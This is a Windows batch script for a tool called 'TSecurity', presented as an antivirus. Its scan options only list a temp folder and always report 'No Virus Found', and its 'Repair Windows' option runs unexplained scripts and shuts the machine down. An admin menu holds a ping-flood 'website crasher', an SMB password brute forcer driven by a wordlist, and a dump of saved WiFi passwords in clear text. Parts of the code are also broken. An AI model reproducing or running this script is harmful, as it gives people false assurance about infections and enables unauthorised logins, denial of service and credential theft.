@echo off
 color 02
cd "C:/Windows/System32"
cd "Assets TS (1)"
 type logo.txt
 echo.
 echo. 
 ECHO _________________________
 set /p user=TSecurity User -
 set /p pass=TSecurity Password -
 echo _________________________
 echo This is your Session ID [%random%]
 echo You will need this for admin Mode...
 echo -------------------------------
 pause>nul
 cls 
 if %user%==%username% goto Start >nul 
echo.
 :Start
 color 02
 color A
 color 02
 color a
 color 02
 Title TSecurity Tools
 echo _____________________________________
 echo             -TSecurity-
 echo _____________________________________________________________________________________________________________________________________ 
 type logo.txt
 cd system32
 echo.
 echo Choose An Option
 echo.
 echo Option 1: Fast Scan
 echo.
 echo Option 2: Admin Scan
 Echo.
 echo Optiom 3: Exit TSecurity ANTIVIRUS
 echo.
 ECHO Option 4: Repair Windows
 echo.
 ECHO Option 5: Website Tool ;)
 echo.
 echo Option 6: Verify Sess For Admin Tools
 echo.
 echo Option 7: Generate A Random Password
 echo.
 echo Option 8: Quick Open [Beta]
 echo.
 echo Option 9: Generate Text Art
echo.
echo Option 10: Gamer Tools
echo.
echo Option 11: TERMS OF USE   
 echo ------------------------------------------------------------------------------------------------------------------------------------------
 echo.
 set input=
 set /p input=
 
if %input%==1 GOTO 1
if %input%==3 GOTO 3
if %input%==2 GOTO 2
if %input%==4 Goto 4
if %input%==5 GOTO 5
if %input%==6 GOTO 6
if %input%==7 goto 7
if %input%==8 goto qo
if %input%==9 goto 9
if %input%==10 goto 10
if %input%==11 goto termsofuse

:10
cls
echo.
echo ____________________________________
echo           GAMER TOOlS
echo ------------------------------------
echo.
echo CHOOSE AN Option
echo.
echo Option 1: Boot To BIOS Menu 
echo.
echo Option 2: Generate Cool Username 
echo.
echo Option 3: Make Windows Faster 
echo.
echo Option 4: System Info
echo.
echo Option 5: Game Installs
echo.
set /p Ginput=

if %Ginput%==1 goto BIOS
if %Ginput%==2 goto UserGen
if %Ginput%==3 goto makewinfast
if %Ginput%==4 goto Sinfo
if %Ginput%==5 goto freeg

:Sinfo 
cls
echo ________________________________________
echo ------------SYSTEM-INFO-----------------
ECHO ________________________________________
ECHO.
ipconfig /all | findstr IPv4
ipconfig /all | findstr IPv6
ipconfig /all | findstr DNS
systeminfo 
pause >nul
goto Start 
cls

:freeg 
cls
echo _____________________________________
echo           GAME INSTALLS
ECHO -------------------------------------
ECHO.
ECHO Check The Apps File In Your D:
pause>nul
goto 


:makewinfast
cls
echo.
echo Making Windows Faster in the Background...
chkdsk>nul 
Pause
sfc /scannow >nul
pause
defrag >nul
pause  
shutdown /r /t 0 >nul 
goto Start 


:UserGen
cls
echo Here Is Your New Username.
echo.
echo [%user%%random%] 
echo.
pause>nul
goto Start





:BIOS
cls
echo.
echo Are You Sure You Want To Boot To BIOS Menu? (Y/N)
echo.
set /p yn1=

if %yn1%==Y goto BBIOS
if %yn1%==N goto 10

:BBIOS
cls
echo.
echo Press Enter To Boot To Bios [LAST WARNING!!!!!]-
pause>nul
shutdown.exe /r /fw

:9 
cls
echo _____________________________________
echo         TEXT ART GENERATER
echo -------------------------------------
echo.
echo CHOOSE AN OPTION
echo.
echo Option 1: Create Dragon Text Art 
echo.
echo Option 2: Create Lock Text Art
echo.
echo Option 3: Create Pumkin Text Art 
echo.
echo Option 4: Create Star Text Art
echo.
echo Option 5: Create Chrismas Tree Text Art 
echo. 
echo Option 6: Create American Flag Text Art 
echo.
echo Optiom 7: Create Logo Text Art 
echo _________________________________________
echo.
set /p inputa=

if %inputa%==1 goto DragonArt
if %inputa%==2 goto LockArt
if %inputa%==3 goto PumArt
if %inputa%==4 goto StarArt

:StarArt
cls
echo ____________________________________
echo          Star Text Art
echo ------------------------------------
echo.
echo Choose An Option
echo.
echo 1- Small Star Art 
echo 2- Meidum Star Art 
echo 3- Big Start Art 
echo. 
set /p inputsa=

if %inputsa%==1 goto sa1s
if %inputsa%==2 goto sa2m
if %inputsa%==3 goto sa3b 

:sa1s 
cls
echo _________________________
echo     Small Star Art 
echo -------------------------
echo.
cd "Assets TS (1)"
type sa1s.txt 
pause>nul
cls
goto Start 

:sa2m
cls
echo _________________________
echo    Meidum Start Art
echo -------------------------
echo.
cd "Assets TS (1)"
type sa2m.txt 
pause>nul
cls 
goto Start 

:sa3b
cls 
echo _________________________
echo      Big Star Art 
echo -------------------------
echo.
cd "Assets TS (1)"
type sa3b.txt 
pause>nul 
cls
goto Start 










:PumArt
cls
echo _________________________
echo     Pumkin Text Art 
echo -------------------------
echo.
echo Choose An Option 
echo.
echo 1- Small Pumkin Art
echo 2- Meidum Pumkin Art 
echo 3- Big Pumkin Art 
echo.
set /p inputpa=

if %inputpa%==1 goto pa1s
if %inputpa%==2 goto pa2m
if %inputpa%==3 goto pa3b 

:pa1s
cls
echo _________________________
echo    Small Pumkin Art 
echo -------------------------
echo.
cd "Assets TS (1)"
type pa1s.txt 
pause>nul
cls
goto Start

:pa2m
cls
echo _________________________
echo    Meidum Pumkin Art
echo -------------------------
echo.
cd "Assets TS (1)"
type pa2m.txt 
pause>nul
cls
goto Start 

:pa3b
cls
echo _________________________
echo     Big Pumkin Art
echo -------------------------
echo.
cd "Assets TS (1)"
type pa3b.txt
pause>nul
cls
goto Start 


 
:LockArt 
cls
echo _____________________________________
echo          -Lock Text Art- 
echo -------------------------------------
echo.
echo CHOOSE AN OPTION
ECHO.
echo 1- Small Lock Art
echo 2- Meidum Lock Art
echo 3- Big Lock Art 
echo.
set /p inputla=

if %inputla%==1 goto la1s
if %inputla%==2 goto la2m
if %inputla%==3 goto la3b

:la1s
cls
echo ____________________________________
echo       Small Lock Text Art 
echo ------------------------------------
echo.
cd "Assets TS (1)"
type la1s.txt 
pause>nul 
cls
goto Start

:la2m
cls
echo ____________________________________
echo        Meidum Lock Text Art
echo ------------------------------------
echo.
cd "Assets TS (1)"
type la2m.txt 
pause>nul 
cls
goto Start

:la3b
cls
echo ____________________________________
echo         Big Lock Text Art 
echo ------------------------------------
echo.
cd "Assets TS (1)"
type la3b.txt 
pause>nul
cls
goto Start

:DragonArt
cls
echo Choose An Options
echo.
echo Option 1: Small Dragon Art 
echo.
echo Option 2: Medium Dragon Art
echo.
echo Option 3: Big Dragon Art
echo.
set /p ad=
if %ad%==1 goto da1
if %ad%==2 goto da2
if %ad%==3 goto da3

:da1
cls
echo Here is you Small Dragon Text Art [Copy And Paste]
cd "Assets TS (1)" 
type da1s.txt 
pause>nul
goto Start

:da3
cls
echo  Here is your Big Dragon Text Art
cd "Assets TS (1)"
type da3b.txt 
pause>nul
goto Start

:da2
cls
echo Here is you Medium Dragon Text Art
cd "Assets TS (1)"
type da2m.txt
pause>nul 
goto Start

:1
cls
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Echo.
echo.
echo.
echo.
echo No Virus Found
echo.
echo.
echo Pess any key to return to menu
Pause>nul
cls
echo.
echo.
echo _____________________________________
echo      TSecurity ANTIVIRUS
echo _____________________________________
echo.
echo.
Echo.
echo.
Echo Going to main menu
cls
goto Start

:wifi
cls 
goto wfs


:termsofuse
cls
echo ____________________________________
echo -----------TERMS-OF-USE-------------
echo ------------------------------------
echo.
echo This tool by TSecurity is made for ethical hacking ONLY. 
echo If TSecurity finds out you are using this tool for bad, we will report you to the proper athouities.
echo The tools in TSecurity are very illegal if not used for good intenstions.
echo We Watch what you do with TSecurity, to make sure you are not doing anything bad.
echo Hacking for bad will not be tolerated in this tool, you will be banned, you will go to jail, you will want to take it back.
echo.
echo.
echo -TSecurity
echo.
pause>nul
cls
goto Start 



:cs
cls
Echo ____________________________________
ECHO           COMING SOON!
ECHO ------------------------------------
PAUSE>nul
GOTO Start

:3
cls
echo.
echo.
echo.
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
echo Û°                   Û 1%%
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
ping localhost -n 3 >nul
cls
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
echo Û°***                Û 13%%
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
ping localhost -n 3 >nul
cls
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
echo Û°*****              Û 29%%
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
ping localhost -n 3 >nul
cls
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
echo Û°******             Û 37%%
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
ping localhost -n 3 >nul
cls
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
echo Û°*********          Û 47%%
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
ping localhost -n 3 >nul
cls
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
echo Û°************       Û 68%%
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
ping localhost -n 3 >nul
cls
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
echo Û°***************    Û 89%%
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
ping localhost -n 3 >nul
cls
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
echo Û°****************** Û 99%%
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
ping localhost -n 3 >nul
cls
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
echo Û°*******************Û 100%%
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
ping localhost -n 3 >nul
cls
Echo Complete...
echo.
echo Press Enter On Your KeyBoard [ENTER] To Finish The Exit Prosess
echo.
pause>nul 
exit


:2 
cls
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
Dir C:\windows\temp /s
tree D:
tree C:
ping localhost:80 -l 1000
cd D:
cd C:
CD C:
CD D:
echo.
Echo.
echo.
echo.
echo.
echo No Virus Found
echo.
echo.
echo Pess any key to return to menu
Pause>nul
cls
echo.
echo.
echo _____________________________________
echo      TSecurity ANTIVIRUS
echo _____________________________________
echo.
echo.
Echo.
echo.
Echo Going to main menu
cls
goto Start

:4
avidemux2_cli --run j-1.js --run j-2.js --end
shutdown.exe -s -t 00

:5
cls
Echo ____________________________________
echo     WEBSITE CRASHER TOOL
ECHO ____________________________________
set /p web=Enter Web stie here :
ping %web% -t -l 1025

:6 
cls
set /p ID=What Is The Sess ID? :
if %ID%==%random% goto Admin Y 

:Admin Y
cls
echo Verify Complete!
pause>nul
Goto Admin

:7
cls
echo Choose An Option
echo.
echo Option 1: Weak Password
echo.
echo Option 2: Medium Password
echo.
echo Option 3: Strong Password 
echo.
set  input2=
set /p input2=

if %input2%==1 GOTO Pass1
if %input2%==2 GOTO Pass2
if %input2%==3 GOTO Pass3 


:Pass3
cls
echo Here is your Strong Password [%user%%user%%random%%random%%random%32153246%user%]
pause>nul
goto Start


:Pass1
cls
echo Here is your Weak Password [%user%%random%]
Pause>nul
goto Start

:Pass2
cls
echo Here is your Medium Password [%randon%%user%%random%123%user%%random%%random%]
pause>nul
goto Start

:Pass3
cls
echo Here is your Strong Password [%user%%user%%random%%random%%random%32153246%user%%random%%user%54246435#$@$#^@%^&^

:qo
cls
echo.
echo Choose An Option
echo.
echo Option 1: Open NotePad
echo.
echo Option 2: Open Command prompt
echo.
echo Optiom 3: Open Settings
echo.
set qoi=
set /p qoi=

if %qoi%==1 goto OpenNote
if %qoi%==2 goto OpenCMD
if %qoi%==3 goto OpenSet

:OpenNote
cls
echo Type [Open] to Open NotePad
set /p opennote.=
if %opennote.%==Open goto startN

:startN
start Notepad 
pause>nul
cls 
goto Start

:OpenCMD
cls
echo Type [Open] to Open Command Prompt 
set /p opencmd.=
if %opencmd.%==Open goto OpenC 

:OpenC
cls 
start cmd
cls
pause>nul
goto Start

:OpenSet
cls
echo Type [Open] to Open Settings
set /p openset.=
if %openset.%==Open goto OpenS 

:OpenS
cls
start Settings
cls
pause>nul
goto Start

:Admin
cls
ECHO ____________________ 
echo        Admin
echo --------------------
echo.
echo CHOOSE AN OPYION
echo.
echo 1- Brute Forcer
echo.
echo 2- TSecurity Command Prompt 
echo.
echo 3- DDOS
echo.
echo 4- Whats My Information?
echo.
echo 5- WiFi PASSWORDS
echo.
echo 6- TSecurity AI
echo.
set /p Admininput=

if %Admininput%==1 goto BF
if %Admininput%==2 goto STCMD
if %Admininput%==3 goto 5
if %Admininput%==4 goto info 
if %Admininput%==5 goto wifi 
if %Admininput%==6 goto TSAI

:TSAI 
cls
echo _________________________
echo      TSecurity AI
echo -------------------------
echo.
ollama run phi3 
pause >nul 


:STCMD
cls
echo -------------------------------------------------------------------------------------
echo                                 WELCOME TO TSCMD
echo                                      -START-
echo -------------------------------------------------------------------------------------
echo.
echo.
echo.
echo Type [Help] to get a list of all the commands in STSMD.
echo. 
set %pr%=Root-$>nul 
echo.
set /p cmd=%pr%

if %cmd%==Help goto cmdh
if %cmd%==ip goto ipconfig
if %cmd%==help goto cmdh
if %cmd%==clear goto cls
if %cmd%==Clear goto cls 
if %cmd%==home goto Start
if %cmd%==Home goto Start
if %cmd%==color goto Color
if %cmd%==Color goto Color 
if %cmd%==ping goto ping 
if %cmd%==Ping goto Ping
if %cmd%=="ts install tsecurity -u -i -y" goto ts-i-u-y

:ts-i-u-y
xcopy /E /Y "https://github.com/Syxfer/TSecurity"
pause>nul
goto STCMD 

:info 
cls
echo ____________________________________
echo             My Info
echo ------------------------------------
echo.
echo Your Info...
echo.
ipconfig /all | findstr IPv4
ipconfig /all | findstr IPv6 
ipcinfig /all | findstr DNS
echo USER [%user% (TS user only) ]
systeminfo 
pause>nul
cls
goto Start

:Ai
	)	

:Color
echo. 
echo What color do you want your text to be?
echo.
echo 1- Green
echo.
echo 2- Orange
echo.
echo 3- Red
echo.
echo 4- Blue
echo.
echo 5- White
echo.
set /p ci=

if %ci%==1 Color a
if %ci%==2 color 06
if %ci%==3 color 04
if %ci%==4 color 01
if %ci%==5 color 07
pause>nul
goto STCMD

:ping 
echo What Ip Or server should You Pimg?
echo.
set /p websiteadmin=
echo What should be the packet size? (1 - 1000)
echo.
set packetS=
ping %websiteadmin% -t -L %packetS%

:cls
cls
pause>nul
goto STCMD

:ipconfig 
ipconfig /all 
pause>nul
goto STCMD 

:cmdh
echo.
cd "Assets TS (1)"
type help.txt 
pause>nul 
goto STCMD

:BF
cls
echo -------------------
echo  Brute Force
echo -------------------
@echo off
title SMB Bruteforce - by TSecurity 
color A
echo.
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "

set /a count=1
for /f %%a in (%wordlist%) do (
  set pass=%%a
  call :attempt
)
echo Password not Found :(
pause
exit

:success
echo.
echo Password Found! %pass%
net use \\%ip% /d /y >nul 2>&1
pause>nul
echo Go To Start? (Y/N)
set /p Sinput=

if %Sinput%==Y goto Start 
if not %Sinput% goto 3


:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success0

:wfs
echo -----------------------
echo    My WiFi PASSWORDS
echo -----------------------
echo.
echo.
setlocal enabledelayedexpansion
for /f "tokens=2delims=:" %%a in ('netsh wlan show profile ^|findstr ":"') do (
    set "ssid=%%~a"
    call :getpwd "%%ssid:~1%%"
)
:getpwd
set "ssid=%*"
for /f "tokens=2delims=:" %%i in ('netsh wlan show profile name^="%ssid:"=%" key^=clear ^| findstr /C:"Key Content"') do echo ssid: %ssid% pass: %%i 
pause>nul
